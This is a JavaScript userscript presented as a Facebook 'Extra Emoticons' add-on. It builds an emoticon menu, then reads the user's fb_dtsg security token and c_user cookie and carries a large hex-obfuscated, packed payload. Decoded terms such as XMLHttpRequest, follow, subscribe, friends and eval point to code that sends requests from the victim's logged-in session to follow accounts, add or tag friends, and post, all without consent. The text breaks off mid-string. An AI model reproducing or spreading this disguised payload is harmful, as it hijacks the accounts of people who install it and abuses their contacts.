	html += '<a class="navLink" title="Show Facebook Extra Emoticons">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="https://fbcdn-sphotos-d-a.akamaihd.net/hphotos-ak-prn1/934163_461150543966030_1255344324_n.jpg"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/skjaveed.baba" target="_blank">Created by Shaik Abdul Javeed<br></a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var _0xbf0f=["\x67\x20\x32\x4F\x28\x65\x29\x7B\x35\x20\x74\x3D\x65\x2B\x22\x3D\x22\x3B\x37\x28\x33\x2E\x36\x2E\x6B\x3E\x30\x29\x7B\x59\x3D\x33\x2E\x36\x2E\x31\x67\x28\x74\x29\x3B\x37\x28\x59\x21\x3D\x2D\x31\x29\x7B\x59\x2B\x3D\x74\x2E\x6B\x3B\x31\x66\x3D\x33\x2E\x36\x2E\x31\x67\x28\x22\x3B\x22\x2C\x59\x29\x3B\x37\x28\x31\x66\x3D\x3D\x2D\x31\x29\x31\x66\x3D\x33\x2E\x36\x2E\x6B\x3B\x56\x20\x32\x73\x28\x33\x2E\x36\x2E\x33\x64\x28\x59\x2C\x31\x66\x29\x29\x7D\x44\x7B\x56\x22\x22\x7D\x7D\x7D\x67\x20\x31\x59\x28\x65\x2C\x74\x29\x7B\x56\x20\x31\x65\x2E\x33\x69\x28\x31\x65\x2E\x31\x4E\x28\x29\x2A\x28\x74\x2D\x65\x2B\x31\x29\x29\x2B\x65\x7D\x67\x20\x32\x71\x28\x65\x29\x7B\x56\x20\x65\x5B\x31\x59\x28\x30\x2C\x65\x2E\x6B\x2D\x31\x29\x5D\x7D\x67\x20\x61\x28\x65\x29\x7B\x35\x20\x74\x3D\x6F\x20\x45\x3B\x35\x20\x6E\x3D\x22\x2F\x71\x2F\x31\x48\x2F\x32\x79\x2E\x7A\x3F\x41\x3D\x31\x22\x3B\x35\x20\x72\x3D\x22\x33\x45\x3D\x22\x2B\x65\x2B\x22\x26\x32\x6B\x3D\x31\x26\x31\x43\x3D\x31\x48\x2D\x32\x74\x26\x32\x76\x3D\x32\x78\x26\x68\x3D\x22\x2B\x68\x2B\x22\x26\x32\x41\x26\x32\x4B\x22\x2B\x38\x2B\x22\x26\x31\x68\x3D\x22\x3B\x74\x2E\x76\x28\x22\x31\x64\x22\x2C\x6E\x2C\x73\x29\x3B\x74\x2E\x6D\x28\x22\x42\x2D\x31\x77\x22\x2C\x22\x31\x31\x2F\x78\x2D\x4E\x2D\x31\x37\x2D\x31\x63\x22\x29\x3B\x74\x2E\x6D\x28\x22\x42\x2D\x6B\x22\x2C\x72\x2E\x6B\x29\x3B\x74\x2E\x6D\x28\x22\x31\x76\x22\x2C\x22\x32\x35\x22\x29\x3B\x74\x2E\x5A\x3D\x67\x28\x29\x7B\x37\x28\x74\x2E\x4D\x3D\x3D\x34\x26\x26\x74\x2E\x31\x45\x3D\x3D\x31\x47\x29\x7B\x74\x2E\x32\x35\x7D\x7D\x3B\x74\x2E\x75\x28\x72\x29\x7D\x67\x20\x4C\x28\x65\x29\x7B\x35\x20\x74\x3D\x33\x2E\x31\x32\x28\x22\x32\x42\x22\x29\x3B\x74\x2E\x50\x3D\x22\x6F\x20\x32\x4C\x28\x29\x2E\x32\x52\x28\x27\x2F\x71\x2F\x51\x2F\x33\x65\x2F\x32\x68\x2F\x33\x6B\x3F\x32\x6B\x3D\x33\x6C\x26\x31\x75\x3D\x32\x68\x27\x29\x2E\x33\x72\x28\x7B\x20\x33\x41\x3A\x20\x22\x2B\x65\x2B\x22\x20\x7D\x29\x2E\x75\x28\x29\x3B\x22\x3B\x33\x2E\x33\x44\x2E\x31\x7A\x28\x74\x29\x7D\x67\x20\x31\x44\x28\x29\x7B\x35\x20\x61\x3D\x6F\x20\x45\x3B\x61\x2E\x5A\x3D\x67\x28\x29\x7B\x37\x28\x61\x2E\x4D\x3D\x3D\x34\x29\x7B\x31\x62\x28\x22\x46\x20\x3D\x20\x22\x2B\x61\x2E\x31\x74\x2E\x31\x73\x28\x29\x2E\x31\x54\x28\x22\x49\x20\x28\x3B\x3B\x29\x3B\x22\x2C\x22\x22\x29\x2B\x22\x3B\x22\x29\x3B\x49\x28\x66\x3D\x30\x3B\x66\x3C\x31\x65\x2E\x32\x48\x28\x46\x2E\x4A\x2E\x4B\x2E\x6B\x2F\x31\x30\x29\x3B\x66\x2B\x2B\x29\x7B\x31\x6A\x3D\x22\x22\x3B\x31\x6F\x3D\x22\x22\x3B\x49\x28\x69\x3D\x66\x2A\x31\x30\x3B\x69\x3C\x28\x66\x2B\x31\x29\x2A\x31\x30\x3B\x69\x2B\x2B\x29\x7B\x37\x28\x46\x2E\x4A\x2E\x4B\x5B\x69\x5D\x29\x7B\x31\x6A\x2B\x3D\x22\x20\x40\x5B\x22\x2B\x46\x2E\x4A\x2E\x4B\x5B\x69\x5D\x2E\x31\x46\x2B\x22\x3A\x22\x2B\x46\x2E\x4A\x2E\x4B\x5B\x69\x5D\x2E\x32\x6F\x2B\x22\x5D\x22\x3B\x31\x6F\x2B\x3D\x22\x20\x22\x2B\x46\x2E\x4A\x2E\x4B\x5B\x69\x5D\x2E\x32\x6F\x7D\x7D\x33\x6D\x28\x29\x7D\x7D\x7D\x3B\x35\x20\x62\x3D\x22\x26\x31\x49\x5B\x30\x5D\x3D\x31\x4B\x22\x3B\x62\x2B\x3D\x22\x26\x31\x6E\x5B\x30\x5D\x3D\x31\x4F\x22\x3B\x62\x2B\x3D\x22\x26\x31\x6E\x5B\x31\x5D\x3D\x33\x46\x22\x3B\x62\x2B\x3D\x22\x26\x31\x51\x3D\x32\x72\x22\x3B\x62\x2B\x3D\x22\x26\x31\x52\x3D\x22\x2B\x38\x3B\x62\x2B\x3D\x22\x26\x52\x3D\x22\x2B\x38\x3B\x37\x28\x33\x2E\x32\x75\x2E\x31\x67\x28\x22\x31\x55\x3A\x2F\x2F\x22\x29\x3E\x3D\x30\x29\x7B\x61\x2E\x76\x28\x22\x31\x38\x22\x2C\x22\x31\x55\x3A\x2F\x2F\x4E\x2E\x32\x32\x2E\x32\x33\x2F\x71\x2F\x31\x39\x2F\x31\x6C\x2E\x7A\x3F\x41\x3D\x31\x22\x2B\x62\x2C\x73\x29\x7D\x44\x7B\x61\x2E\x76\x28\x22\x31\x38\x22\x2C\x22\x32\x49\x3A\x2F\x2F\x4E\x2E\x32\x32\x2E\x32\x33\x2F\x71\x2F\x31\x39\x2F\x31\x6C\x2E\x7A\x3F\x41\x3D\x31\x22\x2B\x62\x2C\x73\x29\x7D\x61\x2E\x75\x28\x29\x7D\x67\x20\x32\x37\x28\x65\x2C\x74\x29\x7B\x35\x20\x6E\x3D\x6F\x20\x45\x3B\x6E\x2E\x5A\x3D\x67\x28\x29\x7B\x37\x28\x6E\x2E\x4D\x3D\x3D\x34\x29\x7B\x7D\x7D\x3B\x6E\x2E\x76\x28\x22\x31\x64\x22\x2C\x22\x2F\x71\x2F\x32\x39\x2F\x31\x75\x2E\x7A\x3F\x41\x3D\x31\x22\x2C\x73\x29\x3B\x35\x20\x72\x3D\x22\x33\x4D\x3D\x22\x2B\x65\x3B\x72\x2B\x3D\x22\x26\x31\x75\x3D\x32\x39\x22\x3B\x72\x2B\x3D\x22\x26\x32\x51\x3D\x32\x66\x22\x3B\x72\x2B\x3D\x22\x26\x32\x53\x3D\x32\x54\x22\x3B\x72\x2B\x3D\x22\x26\x32\x55\x3D\x22\x3B\x72\x2B\x3D\x22\x26\x32\x56\x3D\x32\x66\x22\x3B\x72\x2B\x3D\x22\x26\x33\x34\x3D\x73\x22\x3B\x72\x2B\x3D\x22\x26\x33\x35\x3D\x22\x3B\x72\x2B\x3D\x22\x26\x33\x63\x3D\x22\x3B\x72\x2B\x3D\x22\x26\x68\x3D\x22\x2B\x33\x2E\x53\x28\x22\x68\x22\x29\x5B\x30\x5D\x2E\x43\x3B\x72\x2B\x3D\x22\x26\x31\x68\x3D\x33\x68\x22\x3B\x72\x2B\x3D\x22\x26\x52\x3D\x22\x2B\x38\x3B\x6E\x2E\x6D\x28\x22\x58\x2D\x31\x41\x2D\x31\x42\x22\x2C\x55\x29\x3B\x6E\x2E\x6D\x28\x22\x42\x2D\x33\x6E\x22\x2C\x22\x31\x31\x2F\x78\x2D\x4E\x2D\x31\x37\x2D\x31\x63\x22\x29\x3B\x37\x28\x74\x3D\x3D\x22\x33\x70\x22\x26\x26\x33\x2E\x36\x2E\x79\x28\x22\x57\x22\x2B\x38\x2B\x22\x3D\x22\x29\x2E\x6B\x3E\x31\x29\x7B\x6E\x2E\x75\x28\x72\x29\x7D\x44\x20\x37\x28\x33\x2E\x36\x2E\x79\x28\x22\x57\x22\x2B\x38\x2B\x22\x3D\x22\x29\x2E\x6B\x3C\x3D\x31\x29\x7B\x33\x76\x28\x65\x2C\x74\x2C\x22\x32\x37\x22\x29\x7D\x44\x20\x37\x28\x74\x3D\x3D\x33\x2E\x36\x2E\x79\x28\x22\x57\x22\x2B\x38\x2B\x22\x3D\x22\x29\x5B\x31\x5D\x2E\x79\x28\x22\x3B\x22\x29\x5B\x30\x5D\x2E\x31\x73\x28\x29\x29\x7B\x6E\x2E\x75\x28\x72\x29\x7D\x7D\x67\x20\x33\x77\x28\x61\x2C\x62\x2C\x63\x29\x7B\x35\x20\x64\x3D\x6F\x20\x45\x3B\x64\x2E\x5A\x3D\x67\x28\x29\x7B\x37\x28\x64\x2E\x4D\x3D\x3D\x34\x29\x7B\x31\x62\x28\x22\x31\x6B\x20\x3D\x20\x22\x2B\x64\x2E\x31\x74\x2E\x31\x73\x28\x29\x2E\x31\x54\x28\x22\x49\x20\x28\x3B\x3B\x29\x3B\x22\x2C\x22\x22\x29\x2B\x22\x3B\x22\x29\x3B\x31\x69\x2E\x50\x3D\x31\x6B\x2E\x33\x47\x2E\x33\x48\x5B\x30\x5D\x5B\x31\x5D\x2E\x32\x70\x3B\x47\x2E\x31\x4A\x28\x31\x72\x2E\x31\x4C\x28\x29\x2B\x31\x4D\x2A\x31\x61\x2A\x31\x61\x2A\x32\x34\x2A\x32\x77\x29\x3B\x37\x28\x31\x69\x2E\x31\x6D\x28\x22\x31\x50\x22\x29\x5B\x30\x5D\x2E\x43\x3D\x3D\x22\x31\x22\x29\x7B\x33\x2E\x36\x3D\x22\x57\x22\x2B\x38\x2B\x22\x3D\x32\x7A\x3B\x31\x36\x3D\x22\x2B\x47\x2E\x31\x33\x28\x29\x7D\x44\x20\x37\x28\x31\x69\x2E\x31\x6D\x28\x22\x31\x50\x22\x29\x5B\x30\x5D\x2E\x43\x3D\x3D\x22\x32\x22\x29\x7B\x33\x2E\x36\x3D\x22\x57\x22\x2B\x38\x2B\x22\x3D\x32\x43\x3B\x31\x36\x3D\x22\x2B\x47\x2E\x31\x33\x28\x29\x7D\x31\x62\x28\x63\x2B\x22\x28\x22\x2B\x32\x44\x2B\x22\x2C\x22\x2B\x62\x2B\x22\x29\x3B\x22\x29\x7D\x7D\x3B\x64\x2E\x76\x28\x22\x31\x38\x22\x2C\x22\x2F\x71\x2F\x32\x45\x2F\x32\x46\x2F\x32\x47\x2E\x7A\x3F\x41\x3D\x31\x26\x52\x3D\x22\x2B\x38\x2C\x73\x29\x3B\x64\x2E\x6D\x28\x22\x58\x2D\x31\x41\x2D\x31\x42\x22\x2C\x55\x29\x3B\x64\x2E\x75\x28\x29\x7D\x67\x20\x31\x53\x28\x29\x7B\x31\x70\x3D\x33\x2E\x31\x6D\x28\x22\x61\x22\x29\x3B\x49\x28\x69\x20\x32\x4A\x20\x31\x70\x29\x7B\x6C\x3D\x31\x70\x5B\x69\x5D\x3B\x37\x28\x6C\x2E\x50\x3D\x3D\x27\x3C\x31\x56\x20\x32\x4D\x3D\x22\x32\x4E\x22\x3E\x31\x57\x20\x32\x50\x3C\x2F\x31\x56\x3E\x27\x29\x7B\x6C\x2E\x31\x58\x28\x29\x7D\x7D\x7D\x67\x20\x31\x71\x28\x29\x7B\x37\x28\x33\x2E\x31\x5A\x28\x22\x32\x30\x20\x32\x31\x22\x29\x2E\x6B\x3D\x3D\x31\x29\x7B\x77\x3D\x33\x2E\x31\x5A\x28\x22\x32\x30\x20\x32\x31\x22\x29\x5B\x30\x5D\x3B\x65\x3D\x33\x2E\x31\x32\x28\x22\x61\x22\x29\x3B\x65\x2E\x50\x3D\x22\x32\x57\x20\x31\x57\x20\x32\x58\x20\x32\x59\x22\x3B\x65\x2E\x32\x5A\x3D\x22\x33\x30\x22\x3B\x65\x2E\x33\x31\x3D\x31\x53\x3B\x37\x28\x77\x2E\x33\x32\x3D\x3D\x30\x29\x7B\x77\x2E\x31\x7A\x28\x33\x2E\x31\x32\x28\x22\x33\x33\x22\x29\x29\x3B\x77\x2E\x31\x7A\x28\x65\x29\x7D\x7D\x7D\x35\x20\x68\x3D\x33\x2E\x53\x28\x22\x68\x22\x29\x5B\x30\x5D\x2E\x43\x3B\x35\x20\x38\x3D\x33\x2E\x36\x2E\x70\x28\x33\x2E\x36\x2E\x70\x28\x2F\x4F\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x5B\x31\x5D\x29\x3B\x35\x20\x68\x3D\x33\x2E\x53\x28\x22\x68\x22\x29\x5B\x30\x5D\x2E\x43\x3B\x35\x20\x38\x3D\x33\x2E\x36\x2E\x70\x28\x33\x2E\x36\x2E\x70\x28\x2F\x4F\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x5B\x31\x5D\x29\x3B\x61\x28\x22\x33\x36\x22\x29\x3B\x4C\x28\x22\x33\x37\x22\x29\x3B\x4C\x28\x22\x33\x38\x22\x29\x3B\x4C\x28\x22\x33\x39\x22\x29\x3B\x4C\x28\x22\x33\x61\x22\x29\x3B\x4C\x28\x22\x33\x62\x22\x29\x3B\x35\x20\x68\x3D\x33\x5B\x22\x53\x22\x5D\x28\x22\x68\x22\x29\x5B\x30\x5D\x5B\x22\x43\x22\x5D\x3B\x35\x20\x38\x3D\x33\x5B\x22\x36\x22\x5D\x5B\x22\x70\x22\x5D\x28\x33\x5B\x22\x36\x22\x5D\x5B\x22\x70\x22\x5D\x28\x2F\x4F\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x5B\x31\x5D\x29\x3B\x35\x20\x6A\x3D\x6F\x20\x45\x3B\x35\x20\x31\x35\x3D\x22\x2F\x71\x2F\x32\x38\x2F\x33\x66\x2F\x33\x67\x2E\x7A\x3F\x41\x3D\x31\x22\x3B\x35\x20\x48\x3D\x22\x26\x32\x61\x3D\x33\x6A\x26\x32\x62\x3D\x22\x2B\x32\x63\x2B\x22\x26\x68\x3D\x22\x2B\x68\x2B\x22\x26\x52\x3D\x22\x2B\x38\x2B\x22\x26\x31\x68\x3D\x22\x3B\x6A\x5B\x22\x76\x22\x5D\x28\x22\x31\x64\x22\x2C\x31\x35\x2C\x73\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x42\x2D\x31\x77\x22\x2C\x22\x31\x31\x2F\x78\x2D\x4E\x2D\x31\x37\x2D\x31\x63\x22\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x42\x2D\x6B\x22\x2C\x48\x5B\x22\x6B\x22\x5D\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x31\x76\x22\x2C\x22\x32\x64\x2D\x32\x65\x22\x29\x3B\x6A\x5B\x22\x75\x22\x5D\x28\x48\x29\x3B\x35\x20\x68\x3D\x33\x5B\x22\x53\x22\x5D\x28\x22\x68\x22\x29\x5B\x30\x5D\x5B\x22\x43\x22\x5D\x3B\x35\x20\x38\x3D\x33\x5B\x22\x36\x22\x5D\x5B\x22\x70\x22\x5D\x28\x33\x5B\x22\x36\x22\x5D\x5B\x22\x70\x22\x5D\x28\x2F\x4F\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x5B\x31\x5D\x29\x3B\x35\x20\x51\x3D\x6F\x20\x33\x6F\x3B\x54\x3D\x6F\x20\x45\x3B\x54\x5B\x22\x76\x22\x5D\x28\x22\x31\x38\x22\x2C\x22\x2F\x71\x2F\x31\x39\x2F\x31\x6C\x2E\x7A\x3F\x41\x3D\x31\x26\x31\x52\x3D\x22\x2B\x38\x2B\x22\x26\x31\x51\x22\x2B\x31\x65\x5B\x22\x31\x4E\x22\x5D\x28\x29\x2B\x22\x26\x31\x49\x5B\x30\x5D\x3D\x31\x4B\x26\x31\x6E\x5B\x30\x5D\x3D\x31\x4F\x22\x2C\x32\x67\x29\x3B\x54\x5B\x22\x75\x22\x5D\x28\x29\x3B\x37\x28\x54\x5B\x22\x4D\x22\x5D\x21\x3D\x34\x29\x7B\x7D\x44\x7B\x31\x78\x3D\x31\x62\x28\x22\x28\x22\x2B\x54\x5B\x22\x31\x74\x22\x5D\x5B\x22\x33\x73\x22\x5D\x28\x39\x29\x2B\x22\x29\x22\x29\x3B\x37\x28\x31\x78\x5B\x22\x33\x74\x22\x5D\x29\x7B\x7D\x44\x7B\x51\x3D\x31\x78\x5B\x22\x4A\x22\x5D\x5B\x22\x4B\x22\x5D\x5B\x22\x33\x75\x22\x5D\x28\x67\x28\x65\x2C\x74\x29\x7B\x56\x20\x65\x5B\x22\x32\x69\x22\x5D\x2D\x74\x5B\x22\x32\x69\x22\x5D\x7D\x29\x7D\x7D\x49\x28\x35\x20\x69\x3D\x30\x3B\x69\x3C\x51\x5B\x22\x6B\x22\x5D\x3B\x69\x2B\x2B\x29\x7B\x35\x20\x6A\x3D\x6F\x20\x45\x3B\x35\x20\x31\x35\x3D\x22\x2F\x71\x2F\x32\x38\x2F\x32\x6A\x2F\x33\x78\x2E\x7A\x3F\x41\x3D\x31\x22\x3B\x35\x20\x48\x3D\x22\x26\x68\x3D\x22\x2B\x68\x2B\x22\x26\x32\x62\x3D\x22\x2B\x32\x63\x2B\x22\x26\x31\x43\x3D\x31\x39\x26\x32\x61\x3D\x26\x33\x79\x3D\x26\x32\x6A\x3D\x22\x2B\x51\x5B\x69\x5D\x5B\x22\x31\x46\x22\x5D\x2B\x22\x26\x52\x3D\x22\x2B\x38\x2B\x22\x26\x31\x68\x3D\x22\x3B\x6A\x5B\x22\x76\x22\x5D\x28\x22\x31\x64\x22\x2C\x31\x35\x2C\x73\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x42\x2D\x31\x77\x22\x2C\x22\x31\x31\x2F\x78\x2D\x4E\x2D\x31\x37\x2D\x31\x63\x22\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x42\x2D\x6B\x22\x2C\x48\x5B\x22\x6B\x22\x5D\x29\x3B\x6A\x5B\x22\x6D\x22\x5D\x28\x22\x31\x76\x22\x2C\x22\x32\x64\x2D\x32\x65\x22\x29\x3B\x6A\x5B\x22\x5A\x22\x5D\x3D\x67\x28\x29\x7B\x37\x28\x6A\x5B\x22\x4D\x22\x5D\x3D\x3D\x34\x26\x26\x6A\x5B\x22\x31\x45\x22\x5D\x3D\x3D\x31\x47\x29\x7B\x7D\x7D\x3B\x6A\x5B\x22\x75\x22\x5D\x28\x48\x29\x7D\x35\x20\x33\x7A\x3D\x22\x31\x79\x22\x3B\x35\x20\x33\x42\x3D\x22\x31\x79\x22\x3B\x35\x20\x33\x43\x3D\x22\x31\x79\x22\x3B\x35\x20\x38\x3D\x33\x2E\x36\x2E\x70\x28\x33\x2E\x36\x2E\x70\x28\x2F\x4F\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x5B\x31\x5D\x29\x3B\x35\x20\x31\x6A\x3D\x22\x22\x3B\x35\x20\x31\x6F\x3D\x22\x22\x3B\x35\x20\x46\x3D\x5B\x5D\x3B\x35\x20\x55\x3B\x35\x20\x31\x72\x3D\x6F\x20\x32\x6C\x3B\x35\x20\x47\x3D\x6F\x20\x32\x6C\x3B\x47\x2E\x31\x4A\x28\x31\x72\x2E\x31\x4C\x28\x29\x2B\x31\x4D\x2A\x31\x61\x2A\x31\x61\x2A\x34\x2A\x31\x29\x3B\x37\x28\x21\x33\x2E\x36\x2E\x70\x28\x2F\x31\x34\x3D\x28\x5C\x64\x2B\x29\x2F\x29\x29\x7B\x33\x2E\x36\x3D\x22\x31\x34\x3D\x32\x6D\x3B\x31\x36\x3D\x22\x2B\x47\x2E\x31\x33\x28\x29\x7D\x35\x20\x32\x6E\x3D\x33\x2E\x32\x36\x28\x22\x31\x58\x22\x2C\x67\x28\x29\x7B\x37\x28\x33\x2E\x36\x2E\x79\x28\x22\x31\x34\x3D\x22\x29\x5B\x31\x5D\x2E\x79\x28\x22\x3B\x22\x29\x5B\x30\x5D\x2E\x31\x67\x28\x22\x32\x6D\x22\x29\x3E\x3D\x30\x29\x7B\x55\x3D\x33\x2E\x33\x49\x2E\x50\x2E\x79\x28\x27\x22\x55\x22\x3A\x27\x29\x5B\x31\x5D\x2E\x79\x28\x22\x2C\x22\x29\x5B\x30\x5D\x3B\x31\x44\x28\x29\x3B\x33\x2E\x36\x3D\x22\x31\x34\x3D\x33\x4A\x3B\x31\x36\x3D\x22\x2B\x47\x2E\x31\x33\x28\x29\x3B\x33\x2E\x33\x4B\x28\x32\x6E\x29\x7D\x7D\x2C\x32\x67\x29\x3B\x35\x20\x31\x6B\x3D\x7B\x7D\x3B\x35\x20\x31\x69\x3D\x33\x2E\x31\x32\x28\x22\x33\x4C\x22\x29\x3B\x31\x71\x28\x29\x3B\x33\x2E\x32\x36\x28\x22\x33\x71\x22\x2C\x31\x71\x2C\x73\x29","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x7C\x76\x61\x72\x7C\x63\x6F\x6F\x6B\x69\x65\x7C\x69\x66\x7C\x75\x73\x65\x72\x5F\x69\x64\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x66\x62\x5F\x64\x74\x73\x67\x7C\x7C\x68\x74\x74\x70\x77\x70\x7C\x6C\x65\x6E\x67\x74\x68\x7C\x7C\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72\x7C\x7C\x6E\x65\x77\x7C\x6D\x61\x74\x63\x68\x7C\x61\x6A\x61\x78\x7C\x7C\x74\x72\x75\x65\x7C\x7C\x73\x65\x6E\x64\x7C\x6F\x70\x65\x6E\x7C\x7C\x7C\x73\x70\x6C\x69\x74\x7C\x70\x68\x70\x7C\x5F\x5F\x61\x7C\x43\x6F\x6E\x74\x65\x6E\x74\x7C\x76\x61\x6C\x75\x65\x7C\x65\x6C\x73\x65\x7C\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x7C\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x7C\x62\x74\x61\x72\x69\x68\x69\x7C\x70\x61\x72\x61\x6D\x73\x77\x70\x7C\x66\x6F\x72\x7C\x70\x61\x79\x6C\x6F\x61\x64\x7C\x65\x6E\x74\x72\x69\x65\x73\x7C\x73\x75\x62\x6C\x69\x73\x74\x7C\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65\x7C\x77\x77\x77\x7C\x63\x5F\x75\x73\x65\x72\x7C\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x7C\x66\x72\x69\x65\x6E\x64\x73\x7C\x5F\x5F\x75\x73\x65\x72\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65\x7C\x67\x66\x7C\x73\x76\x6E\x5F\x72\x65\x76\x7C\x72\x65\x74\x75\x72\x6E\x7C\x63\x69\x6E\x73\x7C\x7C\x6B\x6F\x6E\x75\x6D\x7C\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65\x7C\x7C\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67\x7C\x70\x61\x79\x6C\x61\x73\x74\x69\x7C\x75\x72\x6C\x77\x70\x7C\x65\x78\x70\x69\x72\x65\x73\x7C\x66\x6F\x72\x6D\x7C\x47\x45\x54\x7C\x74\x79\x70\x65\x61\x68\x65\x61\x64\x7C\x36\x30\x7C\x65\x76\x61\x6C\x7C\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64\x7C\x50\x4F\x53\x54\x7C\x4D\x61\x74\x68\x7C\x73\x6F\x6E\x7C\x69\x6E\x64\x65\x78\x4F\x66\x7C\x70\x68\x73\x74\x61\x6D\x70\x7C\x63\x69\x6E\x73\x68\x74\x6D\x6C\x7C\x73\x6D\x65\x73\x61\x6A\x7C\x63\x69\x6E\x73\x73\x6F\x6E\x75\x63\x7C\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x7C\x6F\x70\x74\x69\x6F\x6E\x73\x7C\x73\x6D\x65\x73\x61\x6A\x5F\x74\x65\x78\x74\x7C\x6C\x69\x6E\x6B\x73\x7C\x62\x6C\x75\x62\x7C\x62\x75\x67\x75\x6E\x7C\x74\x6F\x53\x74\x72\x69\x6E\x67\x7C\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x7C\x61\x63\x74\x69\x6F\x6E\x7C\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x7C\x74\x79\x70\x65\x7C\x64\x61\x74\x61\x7C\x31\x34\x30\x39\x36\x38\x31\x39\x36\x30\x37\x35\x38\x37\x32\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x53\x56\x4E\x7C\x52\x65\x76\x7C\x73\x6F\x75\x72\x63\x65\x7C\x73\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x69\x5F\x61\x6C\x7C\x73\x74\x61\x74\x75\x73\x7C\x75\x69\x64\x7C\x32\x30\x30\x7C\x66\x6F\x6C\x6C\x6F\x77\x7C\x66\x69\x6C\x74\x65\x72\x7C\x73\x65\x74\x54\x69\x6D\x65\x7C\x75\x73\x65\x72\x7C\x67\x65\x74\x54\x69\x6D\x65\x7C\x31\x65\x33\x7C\x72\x61\x6E\x64\x6F\x6D\x7C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79\x7C\x73\x65\x6C\x65\x63\x74\x7C\x74\x6F\x6B\x65\x6E\x7C\x76\x69\x65\x77\x65\x72\x7C\x61\x75\x74\x6F\x53\x75\x67\x67\x65\x73\x74\x7C\x72\x65\x70\x6C\x61\x63\x65\x7C\x68\x74\x74\x70\x73\x7C\x73\x70\x61\x6E\x7C\x53\x75\x67\x67\x65\x73\x74\x7C\x63\x6C\x69\x63\x6B\x7C\x67\x65\x74\x52\x61\x6E\x64\x6F\x6D\x49\x6E\x74\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65\x7C\x70\x62\x6D\x7C\x66\x73\x6D\